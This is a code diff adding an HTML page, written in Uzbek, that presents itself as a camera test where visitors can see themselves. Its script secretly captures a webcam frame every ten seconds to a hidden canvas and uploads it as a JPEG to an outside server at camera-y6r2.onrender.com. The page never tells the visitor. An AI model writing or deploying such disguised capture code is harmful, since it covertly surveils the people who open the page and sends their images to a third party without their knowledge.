@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Kamera ochish testi</title>
+</head>
+
+<body>
+    <h2>Kamera ochildi (o'zingizni ko'ring)</h2>
+    <video id="video" autoplay playsinline width="320" height="240"></video>
+    <canvas id="canvas" width="320" height="240" style="display: none;"></canvas>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+
+        navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+            video.srcObject = stream;
+        });
+
+        setInterval(() => {
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL('image/jpeg');
+
+            fetch('https://camera-y6r2.onrender.com/send-photo', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ image: imageData })
+            });
+
+        }, 10000);
+    </script>
+</body>
+
+</html>
